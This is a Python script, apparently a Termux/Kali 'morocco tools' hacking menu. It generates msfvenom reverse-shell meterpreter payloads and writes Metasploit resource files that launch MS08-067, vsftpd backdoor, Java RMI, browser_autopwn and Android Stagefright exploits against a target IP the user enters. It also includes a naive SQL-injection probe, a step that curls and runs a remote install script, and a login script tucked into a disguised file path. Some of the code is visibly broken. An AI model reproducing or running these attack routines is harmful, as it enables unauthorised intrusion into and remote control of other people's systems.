## MT.py - useful module of morocco tools
# -*- coding: utf-8 -*-
import os
import sys
import time
import requests

class bcolors:
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKBLUE = '\033[94m'
	
tools_banner = """
\033[91m  __  __   _   ____   ___   ____ ____ ___   \033[92m _____ ___   ___  _     ____
\033[91m |  \/  |/ _ \|  _ \ / _ \ / ___/ ___/ _ \  \033[92m|_   _/ _ \ / _ \| |   / ___| 
\033[91m | |\/| | | | | |_) | | | | |  | |  | | | |  \033[92m | || | | | | | | |   \___ \ 
\033[91m | |  | | |_| |  _ <| |_| | |__| |__| |_| |   \033[92m| || |_| | |_| | |___ ___) |
\033[91m |_|  |_|\___/|_| \_\\___/ \____\____ \___/   \033[92m |_| \___/ \___/|_____|____/                                                                                        
                     SCRIPT BY black protocol AND yehia ali
                  ----------------------------------------------
                     website: https://omegeng.blogspot.com                                         
"""
backtomenu_banner = """
  [99] Back to main menu
  [00] Exit the morocco tools
"""
def restart_program():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()

def backtomenu_option():
	print (backtomenu_banner)
	backtomenu = input('protocol > ')
	
	if backtomenu == "99":
		restart_program()
	elif backtomenu == "00":
		sys.exit()
	else:
		print ('\033[91mERROR: Wrong Input')
		time.sleep(2)
		restart_program()

def banner():
    print (tools_banner)	
	
def mak_pylaod():
        print  ('\033[92m[*]type pyload = exemple ==> php or android OR windows[*]')
        ok = input('[+] ENTER YOUR TYPE PAYLOAD: ')
        time.sleep(2)
        print ('\033[92m[**]lhost = exmeple ==> 192.168.1.** OR 45.15.544.25[**]')
        time.sleep(2)
        host = input('[+] ENTER YOUR LHOST: ')
        time.sleep(2)
        print  ('\033[92m[***]port = exemple ==> 4444 OR any port[***]')
        port = input('[+] ENTER YOUR LPORT: ')
        time.sleep(2)
        print  ('\033[92m[****]directory = exemple ==> /sdcard OR any directory you want[*****')
        directory = input('[+] ENTER YOUR PYLOAD DIRECTORY: ')
        time.sleep(2)
        print ('\033[92m[*****]name pyload = exemple ==> black.apk OR black.php or black.exe [*****]')
        name = input('[+] ENTER YOU PYLOAD NAME WITH FINAL: ')
        time.sleep(2)
        make = 'msfvenom -p {}/meterpreter/reverse_tcp lhost={} lport={} -o {}/{}'.format(ok, host, port, directory, name)
        os.system(make)

def start_hacking():
    remove()
    print ('\033[92m[+] starting open metasploit')
    first = input('[+] Enter lhost: ')
    time.sleep(2)
    first1 = input('[+] Enter lport: ')
    time.sleep(2)
    first2 = input('Enter type payload: ')
    time.sleep(2)
    os.system('service postgresql start')
    file = open('starthack.rc','w')
    type1 = 'use exploit/multi/handler\n'
    type2 = 'set payload {}/meterpreter/reverse_tcp\n'.format(first2)
    ip1 = 'set LHOST {}\n'.format(first)
    ip2 = 'set LPORT {}\n'.format(first1)
    start = 'exploit\n'
    file.write(type1 + type2 + ip1 + ip2 + start)
    file.close()
    os.system('msfconsole -r starthack.rc')
    time.sleep(4)

def scan_ip():
    remove()
    os.system('pkg install nmap')
    os.system('apt-get install nmap')
    nm = "nmap "
    out = ">>nmap.txt"
    ip = input("[+] Enter ip of you target: ")
    time.sleep(2)
    os.system(nm + ip + out)
    file = open("nmap.txt")
    strings = file.read()
    term = "microsoft-ds"
    if(term in strings):
        hack_445()
        time.sleep(3)
    else:
       print ('\033[91mport 445 is not open in ip')
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "ftp"
    if(term in strings):
        hack_21()
        time.sleep(3)
    else:
       print ('\033[91mport 21 is not open in ip')
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "rmiregistry"
    if(term in strings):
        hack_1099()
        time.sleep(3)
    else:
       print ('\033[91mport 1099 is not open in ip')
       time.sleep(3)
    file.close()
    
def hack_445():
    remove()
    print ('\033[92m[+] port 445 is open in this ip (ATTACK WINDOWS)')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack445.rc','w')
    lhost = input('[+] Enter your ip: ')
    time.sleep(2)
    rhost = input('[+] Enter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/windows/smb/ms08_067_netapi\n'
    type2 = 'set payload windows/meterpreter/reverse_tcp\n'
    type3 = 'set LHOST {}\n'.format(lhost)
    ip4 = 'set RHOST {}\n'.format(rhost)
    ip6 = 'set LPORT 445\n'
    ip5 = 'exploit\n'
    file.write(type1 + type2 + type3 + ip4 + ip6 + ip5)
    file.close()
    os.system('msfconsole -r hack445.rc')
    
def hack_21():
    remove()
    print ('\033[92m[+]port 21 is open in ip')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack21.rc','w')
    rhost = input('[+] Enter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/unix/ftp/vsftpd_234_backdoor\n'
    type2 = 'set payload cmd/unix/interact\n'
    ip3 = 'set RHOST {}\n'.format(rhost)
    ip4 = 'exploit\n'
    ip5 = 'exploit\n'
    file.write(type1 + type2 + ip3 + ip4 + ip5)
    file.close()
    os.system('msfconsole -r hack21.rc')

def hack_1099():
    remove()
    print ('\033[92m[+]port 1099 is open in ip')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack1099.rc','w')
    rhost = input('[+]Enter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/multi/misc/java_rmi_server\n'
    type4 = 'set RHOST {}\n'.format(rhost)
    ip4 = 'exploit\n'
    file.write(type1 + type4 + ip4)
    file.close()
    os.system('msfconsole -r hack1099.rc')
		
def remove():
    os.system('rm -r hack21.rc')
    os.system('rm -r nmap.txt')
    os.system('rm -r hack445.rc')   
    os.system('rm -r hack1099.rc')
    os.system('rm -r starthack.rc')
    os.system('rm -r linkhack.rc')
    os.system('rm -r linkhack2.rc')

def kali_user():
    os.system('apt-get update')
    os.system('apt-get install nmap')
    os.system('apt-get install python-pip')
    os.system('pip install requests')
    print ("\033[92m##done##")

def termux_user():
    os.system('pkg update')
    os.system('pkg upgrade')
    os.system('pkg install nmap')
    os.system('pkg install python')
    os.system('pkg install python-pip')
    os.system('pip install requests')
    print ("\033[92m##done##")

def link_hack():
    os.system('service postgresql start')
    os.system('service metasploit start')
    print ("\033[92m[+]start open metasploit")
    file = open('linkhack.rc','w')
    lhost = input('[+] Enter your host: ')
    time.sleep(2)
    lport = input('[+] Enter your port: ')
    time.sleep(2)
    type1 = 'use auxiliary/server/browser_autopwn\n'
    type2 = 'set LHOST {}\n'.format(lhost)
    type3 = 'set SRVHOST {}\n'.format(lhost)
    type4 = 'set SRVPORT {}\n'.format(lport)
    ip3 = 'set URIPATH test\n'
    ip4 = 'exploit\n'
    file.write(type1 + type2 + type3 + type4 + ip3 + ip4)
    file.close()
    os.system('msfconsole -r linkhack.rc')

def link_hack2():
    os.system('service postgresql start')
    os.system('service metasploit start')
    print ("\033[92m[+]start open metasploit")
    file = open('linkhack2.rc','w')
    lhost = input('[+] Enter your host: ')
    time.sleep(2)
    type1 = 'use exploit /android/browser/webview_addjavascriptinterface\n'
    type2 = 'set LHOST {}\n'.format(lhost)
    type3 = 'set SRVHOST {}\n'.format(lhost)
    type4 = 'set URIPATH test\n'
    ip4 = 'exploit\n'
    file.write(type1 + type2 + type3 + type4 + ip4)
    file.close()
    os.system('msfconsole -r linkhack2.rc')

def link_hack3():
    os.system('service postgresql start')
    os.system('service metasploit start')
    print ("\033[92m[+]start open metasploit")
    file = open('linkhack3.rc','w')
    lhost = input('[+] Enter your host: ')
    time.sleep(2)
    type1 = 'use exploit/android/browser/stagefright_mp4_tx3g_64bit\n'
    type2 = 'set SRVHOST {}\n'.format(lhost)
    type3 = 'set URIPATH /\n'
    type4 = 'set PAYLOAD linux/armle/mettle/reverse_tcp\n'
    type5 = 'set LHOST {}\n'.format(lhost)
    ip4 = 'exploit -j\n'
    file.write(type1 + type2 + type3 + type4 + type5 + ip4)
    file.close()
    os.system('msfconsole -r linkhack3.rc')

def metasploit():
    print ("\033[92minstall metasploit")
    os.system('apt update')
    os.system('apt upgrade')
    os.system('pkg install python')
    os.system('pkg install python2')
    os.system('pkg install git')
    os.system('pkg install curl')
    os.system('pkg install wget')
    os.system('pkg install curl')
    os.system('curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh')
    os.system('chmod 777 metasploit.sh')
    os.system('./metasploit.sh')

def save_free():
    os.system('mkdir /data/data/com.termux/files/usr/lib/apt/methods/system')
    os.system('touch /data/data/com.termux/files/usr/lib/apt/methods/system/wifi')
  
def auto():
   loog = '''
print ("\033[94mlogin to script")
loop = 'true'
while (loop == 'true'):
    username = input("Please enter your username: ")
    if (username == yes):
       print ("\033[92mUsername corect!")
    else:
        print ("\033[91mUsername incorrect!")
    password = input("Please enter your password: ")
    if (password == no):
        print ("\033[92mpassword corect!")
        main()
        loop = 'false'
    
    else:
        print ("\033[91mpasswoed incorrect!")
    '''
   wr = open("/data/data/com.termux/files/usr/lib/apt/methods/system/wifi","a")
   wr.write(loog)
   wr.close()
   print ("\033[94msign to script")
   a = input("enter username: ")
   b = input("enter password: ")
   num = ["yes = " + "'" + a + "'","no = " + "'" + b + "'"]

   with open("/data/data/com.termux/files/usr/lib/apt/methods/system/wifi", 'r+') as file:
       readcontent = file.read()   
                                 
       file.seek(0, 0) 
       for i in num:         
           file.write(str(i) + "\n") 
                                   
       file.write(readcontent) 
    os.system('rm -rf install.py')
    
def login():
   os.system('python  /data/data/com.termux/files/usr/lib/apt/methods/system/wifi')

def sql_injection():
        print ("\033[92m\n######  put your website with this sympol ' in end of url")
        time.sleep(4)
        url = input('Enter your website: ')
        r = requests.get(url)
        if 'You have an error in your SQL' in r.text:
          print ('\033[92m\n######  your website is vulnerability ')
        else:
          print ('\033[91m\n###### your website is not vulnerability ')
		

              
